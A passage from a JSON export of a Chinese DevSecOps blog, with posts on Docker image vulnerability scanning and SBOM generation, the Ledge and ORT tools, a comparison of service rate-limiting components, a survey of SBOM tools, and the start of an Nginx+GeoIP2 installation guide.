curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\n✗ Medium severity vulnerability found in curl&#x2F;libcurl\n  Description: Out-of-bounds Write\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938012\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\n✗ Medium severity vulnerability found in curl&#x2F;libcurl\n  Description: Allocation of Resources Without Limits or Throttling\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938014\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\n✗ High severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21476\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987664\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ High severity vulnerability found in busybox&#x2F;busybox\n  Description: Use After Free\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-BUSYBOX-2953070\n  Introduced through: busybox&#x2F;busybox@1.35.0-r13, ca-certificates&#x2F;ca-certificates@20211220-r0, fontconfig&#x2F;fontconfig@2.14.0-r0, java-cacerts&#x2F;java-cacerts@1.0-r1, java-common&#x2F;java-common@0.5-r0, mkfontscale&#x2F;mkfontscale@1.2.2-r0, alpine-baselayout&#x2F;alpine-baselayout-data@3.2.0-r20, busybox&#x2F;ssl_client@1.35.0-r13\n  From: busybox&#x2F;busybox@1.35.0-r13\n  From: ca-certificates&#x2F;ca-certificates@20211220-r0 &gt; busybox&#x2F;busybox@1.35.0-r13\n  From: fontconfig&#x2F;fontconfig@2.14.0-r0 &gt; busybox&#x2F;busybox@1.35.0-r13\n  and 5 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 1.35.0-r15\n\n✗ Critical severity vulnerability found in zlib&#x2F;zlib\n  Description: Out-of-bounds Write\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-ZLIB-2976176\n  Introduced through: zlib&#x2F;zlib@1.2.12-r1, curl&#x2F;libcurl@7.83.1-r1, libxml2&#x2F;libxml2@2.9.14-r0, .httpd-so-deps@20220613.233641, apk-tools&#x2F;apk-tools@2.12.9-r3, freetype&#x2F;freetype@2.12.1-r0, libpng&#x2F;libpng@1.6.37-r1, libfontenc&#x2F;libfontenc@1.1.4-r0, mkfontscale&#x2F;mkfontscale@1.2.2-r0, openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, perl&#x2F;perl@5.34.1-r0, python3&#x2F;python3@3.10.4-r0\n  From: zlib&#x2F;zlib@1.2.12-r1\n  From: curl&#x2F;libcurl@7.83.1-r1 &gt; zlib&#x2F;zlib@1.2.12-r1\n  From: libxml2&#x2F;libxml2@2.9.14-r0 &gt; zlib&#x2F;zlib@1.2.12-r1\n  and 9 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 1.2.12-r2\n\n✗ Critical severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: Incorrect Conversion between Numeric Types\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987669\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ Critical severity vulnerability found in curl&#x2F;libcurl\n  Description: Incorrect Default Permissions\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938013\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; curl&#x2F;libcurl@7.83.1-r1\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 7.83.1-r2\n\n\n\nOrganization:      gwarloki\nPackage manager:   apk\nProject name:      docker-image|sspringett&#x2F;nvdmirror\nDocker image:      sspringett&#x2F;nvdmirror:latest\nPlatform:          linux&#x2F;amd64\nBase image:        httpd:2.4.54-alpine3.16\nLicenses:          enabled\n\nTested 90 dependencies for known issues, found 16 issues.\n\nYour base image is out of date\n1) Pull the latest version of your base image by running &#39;docker pull httpd:2.4.54-alpine3.16&#39;\n2) Rebuild your local image\n\n-------------------------------------------------------\n\nTesting sspringett&#x2F;nvdmirror:latest...\n\nOrganization:      gwarloki\nPackage manager:   maven\nTarget file:       &#x2F;usr&#x2F;local&#x2F;bin\nProject name:      sspringett&#x2F;nvdmirror:latest:&#x2F;usr&#x2F;local&#x2F;bin\nDocker image:      sspringett&#x2F;nvdmirror:latest\nLicenses:          enabled\n\n✔ Tested 1 dependencies for known issues, no vulnerable paths found.\n\n\nTested 2 projects, 1 contained vulnerable paths.\n扫描Dockerfile文件xfxj01@moses  ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards   main  docker scan --file Dockerfile dashboard:latest\n\n扫描镜像# 随便从habor下载一个比较新的prod镜像\nxfxj01@moses  ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards   main  docker pull registry.happycfc.com&#x2F;prod&#x2F;accounting:2.0.4.11\n# 扫描镜像并保存json文件\nxfxj01@moses  ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards   main  docker scan --json registry.happycfc.com&#x2F;prod&#x2F;accounting:2.0.4.11 &gt; &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;accounting2.\n0.4.11.json\n扫描结果：\n\n\nseverityWithCritical-critical：393\nseverityWithCritical-high：882\nseverityWithCritical-medium:1040\nseverityWithCritical-low:120\npackageManager-debian8:2322\npackageManager-maven:118\n\nDocker SBOM\n\n\n\n\n\n\n\n\ndocker sbom尚处于实验状态，未来版本可能会改变或者被移除。\ndocker sbom使用[[Syft]]项目扫描图像图层来做到这一点，但将来它可能会从图像本身或其他地方读取SBOM。\nusage\n下载插件GitHub - docker&#x2F;sbom-cli-plugin: Plugin for Docker CLI to support SBOM creation using Syft\n检测项目生成SBOM清单文件xfxj01@moses  ~&#x2F;Downloads&#x2F;sbom-cli-plugin_0.6.1_darwin_amd64  .&#x2F;docker-sbom sbom --format cyclonedx-xml registry.happycfc.com&#x2F;prod&#x2F;accounting:2.0.4.11 &gt; &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;accounting.xml\n将SBOM文件上传到DT\n\n\nTODO\n对比方案docker scan vs harbor plugins\nJenkins后者harbor如何集成能力\n\nQ&amp;A数据格式问题![[2022-09-02_周五#关于使用docker-SBOM生成的SBOM问题]]\n解决思路\nsyft只扫描镜像文件的运行软件组件依赖，分开不同的流程，将镜像文件的检查与应用程序的检测从Jenkins job 到发送到不同的DT，后者同一个DT的不同项目名称&#x2F;类型\n寻找更好的扫描镜像的方式，如harbor [[容器镜像安全-trivy]]\n一步到位的治理镜像安全，使用[[容器镜像构建与分发的技术实践与安全思索#基础镜像-Distroless]]\n\nReferences\nGenerate the SBOM for Docker images | Docker Documentation\nVulnerability scanning for Docker local images | Docker Documentation\nSite Unreachable\n\n","slug":"docker镜像安全的检查","date":"2022-08-31T03:46:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"镜像安全,docker,云原生安全","author_index":"Moses"},{"id":"fbe86b2e2e4515d1ae412070b4b7c003","title":"DevSecOps知识平台-ledge","content":"\n\n\n\n\n\n\n\n\n工具的道与术：道，是指这个工具内在的哲学，如果你觉得哲学这个词太大了，也可以叫它逻辑。一个工具的优雅之处就体现在「道」上，「道」虽然貌似虚无缥缈，它却是最容易区分同类型工具之间不同之处的东西。术，就是技术层面，这个工具怎么操作，怎么用起来。\n知识平台-ledge0x01简介DevOps 工具元素周期表 - Ledge DevOps 知识平台Ledge（源自 know-ledge，意指承载物）知识平台是基于我们所进行的一系列 DevOps 实践、敏捷实践、精益实践提炼出来的知识体系。\nLedge —— DevOps knowledge learning platform. DevOps、研发效能知识和工具平台，是我们基于在 ThoughtWorks 进行的一系列 DevOps 实践、敏捷实践、软件开发与测试、精益实践提炼出来的知识体系。它包含了各种最佳实践、操作手册、原则与模式、度量、工具，用于帮助您的企业在数字化时代更好地前进，还有 DevOps 转型。\n0x02架构图\n0x03核心能力\n帮助您的企业在数字化时代更好地前进 \n帮助您设计数字化时代的 DevOps 流程\n帮助您寻找最适合的软件工程技术实践## 0x04对比\n\n0x05Quickstart# 下载项目\ngit clone https:&#x2F;&#x2F;github.com&#x2F;phodal&#x2F;ledge\n# setup\nyarn install\n# run \nyarn start\n# other run command\n  - analyze\n      webpack-bundle-analyzer dist&#x2F;ledge&#x2F;stats-es2015.json\n   - build\n      node --max_old_space_size&#x3D;4096 .&#x2F;node_modules&#x2F;.bin&#x2F;ng build\n   - build:ci\n      node --max_old_space_size&#x3D;4096 .&#x2F;node_modules&#x2F;.bin&#x2F;ng build --configuration ci\n   - build:stats\n      node --max_old_space_size&#x3D;4096 .&#x2F;node_modules&#x2F;.bin&#x2F;ng build --stats-json\n   - changelog\n      conventional-changelog -p angular -i CHANGELOG.md -s\n   - commit\n      git-cz\n   - deploy\n      yarn package &amp;&amp; npx angular-cli-ghpages --repo&#x3D;https:&#x2F;&#x2F;github.com&#x2F;phodal&#x2F;do.git --dir&#x3D;dist&#x2F;static --cname&#x3D;devops.phodal.com\n   - lint\n      yarn ng lint\n   - ng\n      .&#x2F;node_modules&#x2F;.bin&#x2F;ng\n   - package\n      yarn build:ci &amp;&amp; rm -rf dist&#x2F;static &amp;&amp; yarn scully\n   - publish:cloudbase\n      cloudbase hosting:deploy dist&#x2F;static -e ledge2-8daa6a\n   - scully\n      scully --scanRoutes\n   - scully:serve\n      scully serve\n   - start\n      yarn ng serve\n   - test\n      yarn ng test\n   - test:ci\n      yarn ng test --watch&#x3D;false --progress&#x3D;false --browsers&#x3D;ChromeHeadlessCI --codeCoverage\n本地部署：http://localhost:4200\n\n### require\n### install\n### check\n### 进阶\n0x06使用说明\n搭建内部知识库\nMarkdown edit notes\n写作参考，大量实践、图示\n\n0x07应用场景ReferencesDevSecOps在携程的最佳实践\n","slug":"知识平台-ledge","date":"2022-08-25T02:05:00.000Z","categories_index":"DevSecOps","tags_index":"DevSecOps,知识库,DevOps实践,度量,检查清单,设计DevOps,案例学习,工具链","author_index":"Moses"},{"id":"f5c84e15a346599d9534a7755e6c3e3f","title":"软件供应链安全分析工具-ORT","content":"工具-用于审查开源软件ort0x01简介OSS审查工具包（ORT）旨在协助处理在许可证合规性检查中通常需要执行的任务，特别是（但不限于）自由和开源软件依赖项。\n\n👑项目地址GitHub - oss-review-toolkit&#x2F;ort: A suite of tools to assist with reviewing Open Source Software dependencies.\n👸🏻官网oss-review-toolkit.org&#x2F;\n\n0x02架构图0x03核心能力它通过编排_高度可定制_的工具管道来_抽象_基础服务来做到这一点。这些工具作为库实现（用于编程用途），并通过命令行界面（用于脚本使用）：\n\nAnalyzer - 确定项目的依赖项及其元数据，抽象实际使用的软件包管理器或构建系统。\n下载器-获取项目的所有源代码及其依赖项，抽象使用哪种版本控制系统（VCS）或其他方式来检索源代码。\n扫描仪-使用配置的源代码扫描仪来检测许可证&#x2F;版权发现，抽象扫描仪的类型。\nAdvisor（技术顾问）-从配置的漏洞数据服务中检索已使用依赖项的安全建议。\n评估者 - 根据可定制的政策规则和许可证分类评估许可证&#x2F;版权调查结果。\n记者-以各种格式呈现结果，如可视化报告、开源通知或材料清单（BOM），以轻松识别依赖项、许可证、版权或违反政策规则的行为。\n通知器-通过不同渠道（如电子邮件和&#x2F;或JIRA票据）发送结果通知。\n\n","slug":"工具-用于审查开源软件ort","date":"2022-08-23T05:42:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件成分分析工具,软件供应链安全,ORT","author_index":"Moses"},{"id":"79f5d6330829493d02164e331a2eb0fa","title":"服务限流熔断组件选型","content":"\n\n\n\n\n\n\n\n\n架构选的好，下班走的早👌🏻\n服务限流熔断组件选型0x01简介SentinelSentinel 是一款面向分布式服务架构的轻量级流量控制组件，主要以流量为切入点，从流量控制、熔断降级、系统自适应保护等多个维度来保障服务的稳定性，核心思想是：根据对应资源配置的规则来为资源执行相应的流控&#x2F;降级&#x2F;系统保护策略\n0x02架构图\n0x03核心能力0x04对比\n\n\n类别\nHystrix(不维护)\nresilience4j\nSentinel\n\n\n\n隔离策略\n线程池、信号量隔离\n信号量隔离\n信号量隔离、并发线程数限流\n\n\n熔断降级策略\n异常比率\n异常比率、响应时间\n异常比率、异常数、响应时间\n\n\n单机限流\n有限的支持\nRate Limiter\n基于QPS，支持基于调用关系的限流\n\n\n集群限流\n不支持\n不支持\n支持\n\n\n流量整形\n不支持\n简单的Rate Limiter模式\n支持预热模式、匀速摸排对模式\n\n\n系统自适应保护\n不支持\n不支持\n支持\n\n\n热点防护\n不支持\n不支持\n支持\n\n\n规则配置\n支持多种数据源\n有限的形式\n支持多种数据源\n\n\n基于注解的支持\n支持\n支持\n支持\n\n\n扩展性\n插件的形式\n接口的形式\n多个扩展点\n\n\n实时统计的实现\n滑动窗口（基于RxJava)\nRing Bit Buffer\n滑动窗口（LeapArry）\n\n\n控制台\n简单的监控查看\n不提供控制台，可对接其他监控系统\n提供开箱即用的控制台，可配置规则、查看秒级监控、机器发现等\n\n\n0x05Quickstart控制台 · alibaba&#x2F;Sentinel Wiki · GitHub\n0x06使用说明1、资源与规则：Sentinel 可以简单分为 Sentinel 核心库和 Dashboard，核心库不依赖 Dashboard，但是结合 Dashboard 可以获得更好的效果。使用 Sentinel 来进行资源保护，主要分为几个步骤:\n（1）定义资源： 资源可以是程序中的任何内容，例如一个服务，服务里的方法，甚至是一段代码。\n（2）定义规则： Sentinel 支持以下几种规则：流量控制规则、熔断降级规则、系统保护规则、来源访问控制规则 和 热点参数规则。\n（3）检验规则是否生效\n由于 Sentinel 中所有的规则都可以在动态地查询和修改，并且修改后立即生效，并且 Sentinel 中资源定义和规则的配置是分离的。因此在编码时，我们先把需要保护的资源定义好（埋点），之后便可以在需要的时候动态配置规则了。也可以理解为，只要有了资源，我们就能在任何时候灵活地定义各种规则。\n1.1、定义资源：对于资源的定义有两种，一种是硬编码的方式，一种是通过 @SentinelResource 注解的方式。\n（1）硬编码方式(不推荐)：（2）@SentinelResource注解方式(推荐)：\n1.2、定义规则：Sentinel 支持以下几种规则：流量控制规则、熔断降级规则、系统保护规则、来源访问控制规则 和 热点参数规则。\n2、流控规则：2.1、流控规则的核心属性：流量控制，原理是监控应用流量的 QPS 或 并发线程数 等指标，当达到指定阈值时对流量进行控制，避免系统被瞬时的流量高峰冲垮，保障应用高可用性。同一个资源可以创建多条限流规则，一条限流规则由以下属性组成：\n① resource： 资源名，即限流规则的作用对象，默认请求路径。\n② limitApp： 流控针对的调用来源，若为 default 则不区分调用来源，默认值default\n③ count： 限流阈值\n④ grade： 限流阈值类型（1代表 QPS，0 代表并发线程数），默认值QPS\n⑤ strategy： 流控模式\n\n直接拒绝（默认）： 接口达到限流条件时，直接限流\n\n关联： 当关联的资源达到阈值时，就限流自己（适合做应用让步）\n\n链路： 只记录指定链路上的流量，指定资源从入口资源进来的流量，如果达到阈值，就可以限流\n\n\n⑥ controlBehavior： 流控效果\n\n快速失败（默认）： 当 QPS 超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException\n\n排队等待： 这种方式严格控制了请求通过的间隔时间，也即是让请求以均匀的速度通过，对应的是漏桶算法。\n\nWarm Up： 该方式主要用于系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮的情况。预热底层是根据令牌桶算法实现的。\n\n\n2.2、阈值类型：（1）基于 QPS 的流控：\nQPS，每秒请求数，即在不断向服务器发送请求的情况下，服务器每秒能够处理的请求数量。\n（2）基于并发线程数的流控：\n并发数控制用于保护业务线程池不被慢调用耗尽。例如，当应用所依赖的下游应用由于某种原因导致服务不稳定、响应延迟增加，对于调用者来说，意味着吞吐量下降和更多的线程数占用，极端情况下甚至导致线程池耗尽。为应对太多线程占用的情况，业内有使用隔离的方案，比如：\n\n通过不同业务逻辑使用不同线程池来隔离业务自身之间的资源争抢（线程池隔离），这种隔离方案虽然隔离性比较好，但是代价就是线程数目太多，线程上下文切换的 overhead 比较大，特别是对低延时的调用有比较大的影响。\n\n使用信号量来控制同时请求的个数（信号量隔离），这种隔离方案虽然能够控制线程数量，但无法控制请求排队时间，当请求过多时排队也是无益的，直接拒绝能够迅速降低系统压力。\n\n\nSentinel 并发线程数限流不负责创建和管理线程池，而是简单统计当前请求上下文的线程个数（正在执行的调用数目），如果超出阈值，新的请求会被立即拒绝，效果类似于信号量隔离。并发数控制通常在调用端进行配置。\n2.3、流控效果：当系统的流量超过设定的阈值时，sentinel 则采取措施进行流量控制，流控效果总共分为三种：快速失败、Warm Up、排队等待。对应的 FlowRule 中的 controlBehavior字段。\n\n快速失败（默认）： 当 QPS 超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException\n\n排队等待： 这种方式严格控制了请求通过的间隔时间，也即是让请求以均匀的速度通过，对应的是漏桶算法。\n\nWarm Up： 该方式主要用于系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮的情况。预热底层是根据令牌桶算法实现的。\n\n\n\n\n\n\n\n\n\n\n\n注意：若使用除了快速失败之外的流量控制效果，则调用关系限流策略（strategy）会被忽略。\n（1）快速失败：\n默认的流量控制方式，当 QPS 超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException。这种方式适用于对系统处理能力确切已知的情况下，比如通过压测确定了系统的准确水位时\n（2）Warm Up：\n\n\n\n\n\n\n\n\n\n注意：该方式只针对 QPS 流控，对并发线程数流控不支持\n即预热&#x2F;冷启动方式，该方式主要用于系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮的情况。\n预热底层是根据令牌桶算法实现的，源码对应得类在 com.alibaba.csp.sentinel.slots.block.flow.controller.WarmUpController 中，算法中有一个冷却因子coldFactor，默认值是3，即请求 QPS 从 threshold(阈值) / 3 开始，经预热时长逐渐升至设定的 QPS 阈值。\n比如通过 sentinel-dashboard 设定 testWarmUP 资源的 QPS 阈值为，流控效果为 warm up，预热时长为5秒，如下图所示，testWarmUP 资源刚开始限流的阈值为 20/3=7，但经过10秒的预热后，慢慢将阈值升至20。（3）排队等待：\n\n\n\n\n\n\n\n\n\n注意：这一效果只针对QPS流控，并发线程数流控不支持。\n排队等待的方式会以匀速排队方式严格控制请求通过的间隔时间，也就是让请求以均匀的速度通过，其余的排队等待，它还会让设置一个超时时间，当请求超过超时间时间还未处理，则会被丢弃。\nReferenceshttps://mp.weixin.qq.com/s/7p6y4PSy0liv1q8Y4hLPDw\n","slug":"服务限流熔断组件选型","date":"2022-08-22T07:56:20.000Z","categories_index":"分布式,微服务","tags_index":"服务限流,Sentinel,Hystrix,技术选型","author_index":"Moses"},{"id":"b8a4b9dfcb608a8cfda6fb4feb8db13c","title":"软件物料清单工具介绍","content":"SBOM工具介绍Backend据Tidelift统计，92%的应用程序包含开源组件。事实上，现代程序平均有70%是开源软件。根据乔·拜登总统于2021年7月12日发布的《关于提高国家网络安全的行政命令》，这是一项要求。该行政命令将SBOM定义为“包含构建软件中使用的各种组件的详细信息和供应链关系的正式记录”。对于开源软件来说，这是一个特别重要的问题，因为“软件开发者和供应商经常通过组装现有的开源和商业软件组件来创造产品。”\n最佳SBOM实践SBOM应包括:\n\n应用程序的开源库\n\n程序的插件、扩展和其他附件\n\n由开发人员内部编写的自定义源代码\n\n这些组件的版本信息、软件许可状态和补丁状态\n\n自动组件加密签名和验证\n\n自动扫描生成SBOM，作为持续集成&#x2F;持续部署(CI&#x2F;CD)管道的一部分 SBOM也应该使用一致的格式。当前最常见的SBOM格式包括软件包数据交换(SPDX)、软件标识(SWID)标签和OWASP CycloneDX。虽然这些都是标准，但2021年的行政命令并没有强制规定特定的SBOM格式。到目前为止，这三家公司都没有从其他公司中脱颖而出，形成事实上的行业标准。\n\n\n 为了使SBOM更加实用，我们不仅要推动自动化创建SBOM，还要使其成为CI&#x2F;CD管道的一部分。正如国家电信和信息管理局(NTIA)所言，最终目标是按照“机器速度”生成SBOM。\nSBOM使用场景SBOM有三个不同的使用场景：\n\n软件生产商使用SBOM来帮助构建和维护他们提供的软件。\n\n软件采购人员使用SBOM来告知购买前的保证，协商折扣，并计划实施策略。\n\n软件操作人员使用SBOM通知漏洞管理和资产管理，管理许可和合规，并快速识别软件和组件依赖关系和供应链风险。\n\n\n       这之间区别很大。开发人员希望能有在他们的CI&#x2F;CD管道上工作的工具，如CircleCI、Jenkins或Travis CI。运营人员或客户可能甚至不知道什么是CI&#x2F;CD管道，但可能非常关心资产管理和安全补丁更新。\n       Gartner估计，到2025年，60%的构建或采购关键基础设施软件的组织将强制执行SBOM并将其标准化。如今，这一比例不到20%。\n工具介绍AnchoreAnchore已经在SBOM行业工作了6年。它的基础是两个开源项目：Syft是一个命令行接口(CLI)工具和库，用于从容器镜像和文件系统生成SBOM；Grype是一个易于集成的容器镜像和文件系统漏洞扫描工具。您可以在开发过程的每个阶段，从源代码存储库和CI&#x2F;CD管道到容器注册中心和运行时，使用它们一起生成SBOM。这些SBOM保存在一个集中存储库中，以实现完全的可见性和持续的监视，甚至在部署后也是如此。它支持CycloneDX, SPDX和Syft自己的SBOM格式。\nAnchore将其SBOM功能捆绑到Anchor Enterprise 4.0软件SCM(供应链管理)平台中。Anchore的目标是成为您一体化的软件供应链和SBOM安全公司。他们做得很棒。\nFOSSA FOSSA的旗舰程序是一个开源许可证管理器和一个开源漏洞扫描器。仔细想想，SBOM非常自然地适合这些程序。\n 在FOSSA的方法中，你可以将它的SBOM工具与你喜欢的版本控制系统集成，如GitHub、BitBucket或GitLab。或者您可以使用它的命令行并在本地运行它，或者将它集成为CI&#x2F;CD管道的一部分。\n 无论哪种方式，当您扫描您的项目时，FOSSA将自动识别目标代码库的直接依赖项和深度依赖项。这些深度嵌入的代码问题，比如对Log4j的间接依赖调用，可能隐藏在程序中，黑客仍然会利用它们进行破坏。\nMend Mend就是曾经的WhiteSource，它提供了各种软件成分分析(SCA)工具。SBOM被合并到其Mend SCA工具中。因此，Mend与其说是一个开发人员程序或CI&#x2F;CD工具，不如说是程序员的开源许可和安全机制。 因此，可以使用Mend跟踪每个组件，包括直接和传递性依赖、识别漏洞、提供修复路径，并在组件更改时自动更新SBOM记录。该公司声称其专利的可达性路径分析可以告诉您哪些漏洞可以被安全忽略，因为您的应用程序没有使用这些库，或者这些库的使用方式没有暴露这些漏洞。 Software Bill of Materials (SBOM) - Mend\nRezilion DevSecOps公司Rezilion将SBOM作为其整体软件安全和漏洞系统的一部分。它的动态SBOM使用动态运行时分析来跟踪代码更改时的软件攻击面。因此，它会不断查找代码组件的已知弱点。换句话说，这是跟踪和保护代码的二合一方法。\n 除了提供CI&#x2F;CD、staging和生产环境中所有软件组件的实时清单外，它还会不断更新您的SBOM。您可以导出您的SBOM的CycloneDX和Excel电子格式。\nSPDX SBOM Generator SPDX SBOM Generator是一个独立的开源工具，顾名思义：它从当前的包管理器或构建系统创建SPDX SBOM。您可以使用它的命令行从代码生成SBOM数据。它报告代码的组件、许可、版权和安全引用。该数据在SPDX v2.2规范中导出。如果你只需要基础信息，它会很适合你。 [[微软开源其软件材料清单（SBOM）生成工具#0x02SPDX规范]]\nTern 另一个开源SBOM项目，Tern可能与SPDX SBOM Generator很好地配合。不使用包管理器或构建系统，这个SCA工具和Python库为容器镜像和Dockerfiles生成一个SBOM。它还生成SPDX格式的SBOM。\nTauruSeer 这个SBOM程序是以软件即服务(SaaS)的形式提供的。凭借以应用为中心的专利集成方法，Tauruser将认知引擎安全扫描与SBOM相结合。该包将帮助您为开发人员和客户保护和跟踪您的代码。\nVigilant Ops Vigilant Ops是一家医疗设备网络安全公司，其InSightPlatform已将注意力转向SBOM。它的SaaS平台产生、维护、验证共享的认证SBOM。它通过持续的漏洞监视和警报集成了安全性。其SBOM认证采用专利算法，确保所有组件都经过验证，漏洞都有对应链接。 它的安全特性还可以用于其他程序生成的SBOM，它们在静止和传输过程中都被加密\nReferenceslinux基金会OpenSSFOpenChainSite Unreachable\n","slug":"SBOM工具介绍","date":"2022-08-22T02:26:00.000Z","categories_index":"软件供应链安全","tags_index":"SBOM,软件物料清单,软件物料清单生成工具","author_index":"Moses"},{"id":"8f0f57e3d20bdf89f372a3376a26a3ed","title":"开源WAF调研之产品选型-Nginx+GeoIP2","content":"0x00前言描述: 为了实现根据访问者访问我们的网站时根据其IP显示其所属地，也为获取不同地区访问者的IP地址等相关信息为目的，所以在搜索引擎中查找解决方案，在网络上查询到如下几种方案Nginx+GeoIP2、使用收费 IP 识别接口、DNS 根据地域解析，然后经过多方面考究，最终还是使用Nginx+GeoIP2解决方案。\n三种解决方案优缺点\n\nNginx + GeoIP2可以拿到请求 IP 的国家和城市信息然后进行各种个性化 Nginx 配置可以将请求 IP 的地理位置通过 php-fpm 传递 php 程序定时更新 MaxMind 免费数据库（GeoLite2-Country.mmdb + GeoLite2-City.mmdb）完成完美闭环maxmind 公司 2002 年成立至今，靠谱\n\n 使用 IP 识别接口：稳定的需要收费（也不能保证 100% 高可用：限频、响应时间、接口异常等因素），免费的无法保证稳定性，接口远远没有将 GeoLite 数据放在本地稳定\n\n DNS 根据地域解析：cloudflare 收费略贵，国内 cloudxns 已关闭免费服务（免费的东西说变就变，论 planB 的重要性）\n\n\n\n\n\n\n\n\n\n\n\nTIPS: MaxMind GeoIP 已经被弃用了一段时间。对于您最新的地理定位需求，请改用 MaxMind GeoIP2（或免费版本的 GeoLite2）。TIPS: 当前网上大部分Nginx + GeoIP 的教程都是 GeoIP 老版本的已经不适用了当前最新版本的Nginx二进制编译安装，你可参照本章更快的进行实践使用。TIPS: GeoUP 依赖 MaxMind 的 IP 数据，需要频繁更新，所以我们在安装配置后也实现了使用crontab服务，针对其国家城市数据库进行自动化脚本定时更新配置。\n0x01安装部署环境说明# 宿主机系统\n$ uname -a\n113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 x86_64 x86_64 GNU&#x2F;Linux\n$ cat &#x2F;etc&#x2F;issue.net\nUbuntu 20.04.1 LTS\n\n# 应用软件\nnginx-1.22.0.tar.gz\nlibmaxminddb-1.6.0.tar.gz\nngx_http_geoip2_module-3.4.tar.gz\nGeoLite2-City_20220802.tar.gz\nGeoLite2-Country_20220802.tar.gz\n\n系统加固符合等保2.0要求，加固脚本\n资源下载下载地址:（访问密码：2088）\nlibmaxminddb下载描述: 首先安装 libmaxminddb 库，其提供了一个用于读取MaxMind DB文件的C库，包括来自MaxMind的GeoIP2数据库。这是一种自定义二进制格式，旨在促进 IP 地址的快速查找，同时允许在与地址关联的数据类型方面具有极大的灵活性。\n项目地址: https://github.com/maxmind/libmaxminddb下载构建:\nwget -c https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;libmaxminddb&#x2F;releases&#x2F;download&#x2F;1.6.0&#x2F;libmaxminddb-1.6.0.tar.gz\ntar -zxvf libmaxminddb-1.6.0.tar.gz &amp;&amp; cd libmaxminddb-1.6.0\n.&#x2F;configure\nmake &amp;&amp; make install\ntee -a &#x2F;etc&#x2F;ld.so.conf.d&#x2F;libc.conf &lt;&lt;&#39;EOF&#39;\n# libc default configuration\n&#x2F;usr&#x2F;local&#x2F;lib\nEOF\nsudo ldconfig\n或使用apt命令进行安装:\n$ sudo apt update  \n$ sudo apt install libmaxminddb0 